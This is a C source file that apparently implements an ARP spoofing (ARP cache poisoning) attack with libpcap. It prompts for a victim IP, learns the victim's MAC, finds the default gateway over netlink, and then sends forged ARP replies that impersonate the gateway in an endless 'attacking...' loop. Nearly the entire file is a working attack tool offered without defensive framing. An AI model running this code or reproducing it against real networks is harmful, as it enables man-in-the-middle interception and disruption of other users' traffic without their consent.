#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <linux/rtnetlink.h>

#define BUFSIZE 8192

int get_gatewayip(char *gatewayip, socklen_t size);
void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo);
int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId);

struct route_info
{
    struct in_addr dstAddr;
    struct in_addr srcAddr;
    struct in_addr gateWay;
    char ifName[IF_NAMESIZE];
};


int main()
{
   int fd;
   struct ifreq ifr;
   const char *iface = "";
   unsigned char src_mac[6];
   unsigned char src_ip[4];
   unsigned char dst_mac[6];
   unsigned char dst_ip[4];
   unsigned char gate_ip[4];
   char tmp[16];
   int dst_ip_tmp = 0;
   struct in_addr addr;
   //unsigned char *victim_ip;
   pcap_t *handle;			/* Session handle */
   char *dev;			/* The device to sniff on */
   char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
   struct bpf_program fp;		/* The compiled filter */
   char filter_exp[] = "arp";	/* The filter expression */
   bpf_u_int32 mask;		/* Our netmask */
   bpf_u_int32 net;		/* Our IP */
   int i = 0;
   char gateway[20];

   memset(&ifr, 0, sizeof(ifr));
   /* Define the device */
   dev = pcap_lookupdev(errbuf);
   if (dev == NULL) {
       fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
       return(2);
   }
   printf("device found!\n");
   /* Find the properties for the device */
   if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
       fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
       net = 0;
       mask = 0;
   }
   /* Open the session in promiscuous mode */
   handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   if (handle == NULL) {
       fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
       return(2);
   }
   /* Compile and apply the filter */
   if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
       fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
       return(2);
   }
   if (pcap_setfilter(handle, &fp) == -1) {
       fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
       return(2);
   }
   /* Creat a packet */
   printf("input attack ip [(ex) 192.168.12.34] : ");
   scanf("%s", tmp);

   inet_pton(AF_INET, tmp, &dst_ip_tmp);
   //printf("inet_pton(%s) : 0x%x\n", tmp, dst_ip_tmp);
   for(i=0; i<4; i++)
   {
       dst_ip[i] = (dst_ip_tmp >> (i*8)) & 0xff;
   }


   u_char packet[60] = {0,};
   iface = dev;
   fd = socket(AF_INET, SOCK_DGRAM, 0);

   ifr.ifr_addr.sa_family = AF_INET;

   strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

   ioctl(fd, SIOCGIFHWADDR, &ifr);
   for(i=0; i<6; i++)
   {
       src_mac[i] = ifr.ifr_hwaddr.sa_data[i];
   }

   ioctl(fd, SIOCGIFADDR, &ifr);
   for(i=0; i<4; i++)
   {
       src_ip[i] = ifr.ifr_addr.sa_data[i+2];
   }
   /*
    *
   ioctl(fd, SIOCGIFBRDADDR, &ifr);
   for(i=0; i<4; i++)
   {
       brd_ip[i] = ifr.ifr_broadaddr.sa_data[i+2];
   }*/


   close(fd);



   for(i=0; i<6; i++)
   {
       packet[i] = 0xff;
   }
   for(i=6; i<12; i++)
   {
       packet[i] = src_mac[i-6];
   }
   packet[12] = 0x08;
   packet[13] = 0x06;
   packet[14] = 0x00;
   packet[15] = 0x01;
   packet[16] = 0x08;
   packet[17] = 0x00;
   packet[18] = 0x06;
   packet[19] = 0x04;
   packet[20] = 0x00;
   packet[21] = 0x01;
   for(i=22; i<28; i++)
   {
       packet[i] = src_mac[i-22];
   }
   for(i=28; i<32; i++)
   {
       packet[i] = src_ip[i-28];
   }
   for(i=32; i<38; i++)
   {
       packet[i] = 0;
   }

   for(i=38; i<42; i++)
   {
       packet[i] = dst_ip[i-38];
   }


   const int res_send = pcap_sendpacket(handle, packet, 42);
   if(res_send < 0)
   {
       printf("send error!");
       return 0;
   }
   printf("send ok!\n");
   struct pcap_pkthdr * header;
   const u_char * r_packet;
   const int res_rev = pcap_next_ex(handle, &header, &r_packet);
   if(res_rev <= 0)
   {
       printf("recive error!");
       return 0;
   }
   printf("recive ok!\n");
   for(i=0; i<6; i++)
   {
       dst_mac[i] = r_packet[i+6];
   }
   for(i=0; i<6; i++)
   {
       packet[i] = dst_mac[i];
   }
   packet[21] = 0x02; //reply
   get_gatewayip(gateway, 20);
   //fprintf(stderr, "gateway: %s", gateway);
   inet_pton(AF_INET, gateway, &addr.s_addr);

   //printf("inet_pton(%s) : 0x%x\n", gateway, addr.s_addr);

   for(i=0; i<4; i++)
   {
       gate_ip[i] = (addr.s_addr >> (i*8)) & 0xff;
   }

   for(i=28; i<32; i++)
   {
       packet[i] = gate_ip[i-28];
   }
   for(i=32; i<38; i++)
   {
       packet[i] = dst_mac[i-32];
   }
   while(1)
   {
       pcap_sendpacket(handle, packet, 60);
       printf("attacking...\n");
       sleep(3);
   }

   return(0);
}

int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId)
{
    struct nlmsghdr *nlHdr;
    int readLen = 0, msgLen = 0;

    do
    {
        /* Recieve response from the kernel */
        if((readLen = recv(sockFd, bufPtr, BUFSIZE - msgLen, 0)) < 0)
        {
            perror("SOCK READ: ");
            return -1;
        }

        nlHdr = (struct nlmsghdr *)bufPtr;

        /* Check if the header is valid */
        if((NLMSG_OK(nlHdr, readLen) == 0) || (nlHdr->nlmsg_type == NLMSG_ERROR))
        {
            perror("Error in recieved packet");
            return -1;
        }

        /* Check if the its the last message */
        if(nlHdr->nlmsg_type == NLMSG_DONE)
        {
            break;
        }
        else
        {
            /* Else move the pointer to buffer appropriately */
            bufPtr += readLen;
            msgLen += readLen;
        }


        /* Check if its a multi part message */
        if((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0)
        {
            /* return if its not */
            break;
        }
    } while((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));

    return msgLen;
}

/* parse the route info returned */
void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo)
{
    struct rtmsg *rtMsg;
    struct rtattr *rtAttr;
    int rtLen;

    rtMsg = (struct rtmsg *)NLMSG_DATA(nlHdr);

    /* If the route is not for AF_INET or does not belong to main routing table	then return. */
    if((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
        return;

    /* get the rtattr field */
    rtAttr = (struct rtattr *)RTM_RTA(rtMsg);
    rtLen = RTM_PAYLOAD(nlHdr);

    for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen))
    {
        switch(rtAttr->rta_type)
        {
            case RTA_OIF:
            if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);
            break;

            case RTA_GATEWAY:
            memcpy(&rtInfo->gateWay, RTA_DATA(rtAttr), sizeof(rtInfo->gateWay));
            break;

            case RTA_PREFSRC:
            memcpy(&rtInfo->srcAddr, RTA_DATA(rtAttr), sizeof(rtInfo->srcAddr));
            break;

            case RTA_DST:
            memcpy(&rtInfo->dstAddr, RTA_DATA(rtAttr), sizeof(rtInfo->dstAddr));
            break;
        }
    }

    return;
}

// meat
int get_gatewayip(char *gatewayip, socklen_t size)
{
    int found_gatewayip = 0;

    struct nlmsghdr *nlMsg;
    struct rtmsg *rtMsg;
    struct route_info *rtInfo;
    char msgBuf[BUFSIZE]; // pretty large buffer

    int sock, len, msgSeq = 0;

    /* Create Socket */
    if((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0)
    {
        perror("Socket Creation: ");
        return(-1);
    }

    /* Initialize the buffer */
    memset(msgBuf, 0, BUFSIZE);

    /* point the header and the msg structure pointers into the buffer */
    nlMsg = (struct nlmsghdr *)msgBuf;
    rtMsg = (struct rtmsg *)NLMSG_DATA(nlMsg);

    /* Fill in the nlmsg header*/
    nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)); // Length of message.
    nlMsg->nlmsg_type = RTM_GETROUTE; // Get the routes from kernel routing table .

    nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST; // The message is a request for dump.
    nlMsg->nlmsg_seq = msgSeq++; // Sequence of the message packet.
    nlMsg->nlmsg_pid = getpid(); // PID of process sending the request.

    /* Send the request */
    if(send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0)
    {
        fprintf(stderr, "Write To Socket Failed...\n");
        return -1;
    }

    /* Read the response */
    if((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0)
    {
        fprintf(stderr, "Read From Socket Failed...\n");
        return -1;
    }

    /* Parse and print the response */
    rtInfo = (struct route_info *)malloc(sizeof(struct route_info));

    for(;NLMSG_OK(nlMsg,len);nlMsg = NLMSG_NEXT(nlMsg,len))
    {
        memset(rtInfo, 0, sizeof(struct route_info));
        parseRoutes(nlMsg, rtInfo);

        // Check if default gateway
        if (strstr((char *)inet_ntoa(rtInfo->dstAddr), "0.0.0.0"))
        {
            // copy it over
            inet_ntop(AF_INET, &rtInfo->gateWay, gatewayip, size);
            found_gatewayip = 1;
            break;
        }
    }

    free(rtInfo);
    close(sock);

    return found_gatewayip;
}


